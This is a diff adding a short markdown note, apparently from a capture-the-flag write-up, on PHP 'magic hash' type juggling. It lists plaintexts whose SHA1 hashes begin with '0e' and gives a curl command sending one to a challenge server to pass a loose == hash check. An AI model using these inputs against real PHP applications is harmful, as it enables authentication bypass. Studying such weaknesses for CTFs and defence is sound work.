@@ -1,0 +1,15 @@
+### Magic Hashes
+
+A common vulnerability in PHP that fakes hash "collisions..." where the == operator falls short in PHP type comparison, thinking everything that follows 0e is considered scientific notation (and therefore 0). More valuable info can be found here: https://github.com/spaze/hashes, but below are the most common breaks.
+
+
+```
+Plaintext	SHA1 Hash
+aaroZmOk	0e66507019969427134894567494305185566735
+aaK1STfY	0e76658526655756207688271159624026011393
+aaO8zKZF	0e89257456677279068558073954252716165668
+aa3OFF9m	0e36977786278517984959260394024281014729
+```
+
+
+`curl -X GET http://chall.csivit.com:30272/?hash=aaK1STfY`
